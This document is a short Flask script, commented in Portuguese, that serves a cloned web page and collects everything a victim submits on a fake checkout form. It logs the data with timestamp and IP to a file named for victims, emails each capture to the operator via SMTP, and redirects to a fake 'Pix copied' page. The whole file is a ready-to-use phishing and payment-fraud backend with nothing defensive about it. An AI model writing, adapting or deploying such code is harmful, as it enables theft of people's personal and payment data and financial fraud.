from flask import Flask, render_template, request, redirect
import json, uuid, datetime, smtplib

app = Flask(__name__)

@app.route('/')
def index():  
    return render_template('index.html')   # página clonada

@app.route('/checkout', methods=['POST'])
def checkout():
    dados = request.form.to_dict()
    dados['hora'] = str(datetime.datetime.now())
    dados['ip']   = request.remote_addr
    # Salva local
    with open('vitimas.jsonl','a') as f:
        f.write(json.dumps(dados)+'\n')
    # Envia cópia para seu e-mail
    server = smtplib.SMTP('smtp.zoho.com',587)
    server.starttls()
    server.login('seu@e-mail.com','SENHA')
    msg = f"Subject: Nova vitima\n\n{dados}"
    server.sendmail('seu@e-mail.com','seu@e-mail.com',msg)
    server.quit()
    # Redireciona para página de "Pix copiado"
    return redirect('/pix.html?code='+str(uuid.uuid4())[:8])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
